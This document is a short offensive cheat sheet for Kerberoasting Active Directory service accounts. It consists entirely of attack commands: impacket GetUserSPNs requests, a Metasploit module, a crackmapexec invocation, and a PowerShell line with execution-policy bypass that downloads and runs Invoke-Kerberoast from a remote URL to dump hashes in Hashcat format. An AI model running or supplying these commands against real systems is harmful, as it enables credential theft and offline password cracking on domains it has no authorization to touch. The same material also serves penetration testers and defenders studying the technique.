# impacket

```
GetUserSPNs.py -request -dc-ip 172.16.139.3 acme.corp/sql_svc -save
```

# Invoke-Kerberoast and provide Hashcat compatible hashes
```

powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://uri.whatever/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"

```

# Request the Password Hash from the Ticket Granting Service (TGS) for a user account that has an SPN (Service Principal Name) set.  

```
# Add host to /etc/hosts: 1.1.1.1 domain.com  
  
# User and Password  
GetUserSPNs.py DOMAIN.com/USER:PASSWORD -dc-ip DOMAIN.com -request -outputfile kerberoast_hashes.txt  
  
# For LM:NT hash authentication use -hashes LM:NT  
# To use local ccache use -k  
  
or  
  
# Metasploit  
msfconsole -q -x 'use auxiliary/gather/get_user_spns; set rhosts DC-TARGET-IP ; set smbuser USER ; set smbpass PASSWORD ; set smbdomain DOMAIN.com ; run'  
  
or  
  
# You "MIGHT" need to export your ccache alias if you have issues saving it  
export KRB5CCNAME=DOMAIN.ccache  
  
# Crackmapexec  
crackmapexec ldap DOMAIN.com -u USER -p PASSWORD --kerberoasting USER_ccache.txt --kdcHost KDC-TARGET-DOMAIN/IP
```
